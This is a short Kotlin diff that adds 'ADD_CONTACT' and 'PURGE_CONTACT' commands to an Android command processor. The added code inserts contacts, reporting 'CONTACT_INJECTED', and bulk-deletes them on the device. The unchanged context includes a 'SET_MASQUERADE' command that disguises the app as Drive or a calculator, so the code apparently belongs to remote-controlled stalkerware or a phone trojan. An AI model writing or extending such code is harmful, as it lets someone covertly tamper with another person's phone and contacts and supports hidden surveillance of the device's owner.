@@ -763,6 +763,17 @@ object CommandProcessor {
                         status = "AUTO_SWIPE_CLEARED: $type"
                     }
                 }
+                "ADD_CONTACT" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val success = PhoneManager.addContact(ctx, parts[0].trim(), parts[1].trim())
+                        status = if (success) "CONTACT_INJECTED" else "INJECTION_FAILED"
+                    } else status = "FAILED_FORMAT"
+                }
+                "PURGE_CONTACT" -> {
+                    val count = PhoneManager.purgeContact(ctx, content.trim())
+                    status = if (count >= 0) "PURGE_COMPLETE ($count)" else "PURGE_FAILED"
+                }
                 "SET_MASQUERADE" -> {
                     val skin = content.trim().uppercase()
                     if (skin == "DRIVE" || skin == "CALC") {
